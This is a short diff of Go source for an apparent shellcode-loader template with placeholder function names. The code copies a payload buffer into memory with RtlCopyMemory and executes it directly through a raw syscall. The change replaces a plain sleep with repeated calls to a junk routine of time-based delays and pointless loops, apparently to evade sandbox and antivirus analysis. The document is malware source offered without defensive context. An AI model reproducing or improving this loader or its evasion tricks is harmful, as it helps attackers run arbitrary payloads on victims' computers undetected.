@@ -47,22 +47,27 @@ func $genEXE(charcode []byte) {
 	if err != nil && err.Error() != "The operation completed successfully." {
 		syscall.Exit(0)
 	}
+	$gd()
 	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
 	if err != nil && err.Error() != "The operation completed successfully." {
 		syscall.Exit(0)
 	}
-	time.Sleep(5 * time.Second)
+	$gd()
+	$gd()
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
 
 func $gd() int {
-	time.Sleep(time.Duration(2) * time.Second)
-
 	dd := time.Now().UTC().Day()
+	time.Sleep(time.Duration(1) * time.Second)
 	var num = 1
-        for num <= 5 {
+	var nn = 1
+        for num <= dd {
             num++
         }
+                for nn <= num {
+                   nn=num+nn
+                }
 	return dd + time.Now().Second()
 
 }
